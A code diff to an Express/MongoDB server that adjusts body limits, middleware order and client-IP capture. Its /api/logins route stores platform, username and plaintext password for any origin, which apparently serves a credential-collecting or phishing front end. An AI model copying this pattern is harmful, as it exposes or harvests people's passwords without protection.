@@ -7,8 +7,11 @@ require('dotenv').config();
 
 const app = express();
 
-// Middleware
+// MUST BE BEFORE app.use(cors()) and BEFORE routes
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
+// Then CORS
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -16,8 +19,6 @@ app.use(cors({
 }));
 
 
-
-app.use(express.json());
 
 // MongoDB Connection
 mongoose.connect(process.env.MONGODB_URI)
@@ -48,15 +49,19 @@ const candidateSchema = new mongoose.Schema({
 const Candidate = mongoose.model('Candidate', candidateSchema);
 
 // Routes
+
+
 app.post('/api/logins', async (req, res) => {
   try {
     const { platform, username, password } = req.body;
+    
     const newLogin = new Login({
       platform,
       username,
       password,
-      ipAddress: req.ip
+      ipAddress: req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress
     });
+
     await newLogin.save();
     res.status(201).json({ status: 'success', message: 'Login saved' });
   } catch (error) {
@@ -131,6 +136,7 @@ app.post('/api/candidate', async (req, res) => {
     res.status(500).json({ status: 'error', message: error.message });
   }
 });
+
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
